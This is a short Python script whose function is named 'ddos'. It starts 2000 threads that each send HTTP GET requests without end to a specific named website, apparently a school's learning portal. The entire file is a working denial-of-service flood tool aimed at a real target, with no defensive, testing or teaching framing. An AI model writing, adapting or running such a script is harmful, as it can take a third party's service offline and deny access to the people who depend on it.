import requests
import threading

url = "https://sdo.1580.ru/"


def work():
    while True:
        r = requests.get(url)


threads = []


def ddos():
    for i in range(2000):
        t = threading.Thread(target=work)
        threads.append(t)
        t.start()


ddos()
